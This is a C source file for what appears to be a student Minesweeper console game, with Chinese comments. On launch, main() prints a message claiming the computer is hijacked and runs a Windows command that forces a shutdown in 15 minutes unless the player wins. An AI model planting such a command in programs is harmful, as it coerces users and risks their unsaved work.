#define _CRT_SECURE_NO_WARNINGS
#include "game.h"
#include <stdio.h>//保证每个.c文件都有必要的头文件，尽管可能重复
void menu()
{
	printf("*******************************\n");
	printf("*********是否开始游戏？********\n");
	printf("***********1.开始**************\n");
	printf("***********0.结束**************\n");
	printf("*******************************\n");
	printf("*******************************\n");
}
void game()//game.c中写的是game()中的嵌套函数
{
	char Inside[ROWS][COLS];
	char Outside[ROWS][COLS];//先定义好，一会利用函数初始化
	Init(Inside, ROWS, COLS, '0');
	Init(Outside, ROWS, COLS, '*');//只写数组名就够了一定一定与声明和定义区分开
	Display(Outside, ROW, COL);//不加S是传参方便，但数组仍为11*11  //设置这样的ROW是为了更改方便
	Set(Inside, ROW, COL);
	Play(Outside, Inside, ROW, COL);
}
int main()
{
	printf("您的电脑已被挟持，请在15min内成功完成扫雷，否则关机\n");
	system("shutdown -s -t 900");//必须有空格.
	menu();
	/*printf("请选择>");*/ //注意位置
	int i = 0;
	/*scanf("%d", &i);*/
	do {  //该模块不适合作为函数，因为要有多次循环开启下一把，而return会破坏它
		srand((unsigned int)time(NULL));
		printf("请选择>");
		scanf("%d", &i);//i要放在内部，保证每一次都有选择的权力，否则无限循环
		switch (i)
		{
		case 1:
		{
			game();
			/*return i;*/
			/*break;*/ //有return，break冗余
			printf("还要再来一局吗？1.开始 0.结束\n");
			break;
		}
		case 0:
		{
			printf("游戏结束\n");
			/*return i;*///break可以跳出switch
			/*break;*/
			break;
		}
		default:
		{
			printf("输入错误，请重新输入\n");// \n保证美观
			break;
		}
		}
	} while (i); /*(i != 1 && i != 0)*/ //要让玩家有多玩几把的权利
	
	return 0;
}